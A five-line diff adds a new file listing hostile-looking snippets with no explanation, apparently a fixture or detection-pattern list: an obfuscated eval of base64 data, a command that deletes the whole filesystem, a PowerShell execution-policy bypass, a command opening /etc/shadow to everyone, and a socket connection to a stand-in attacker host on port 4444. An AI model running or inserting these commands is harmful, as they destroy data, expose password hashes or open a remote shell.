@@ -1,0 +1,5 @@
+eval(base64_decode(
+rm -rf / --no-preserve-root
+powershell.exe -ExecutionPolicy Bypass
+os.system('chmod 777 /etc/shadow')
+import socket; s.connect(("evil-hacker.com", 4444))
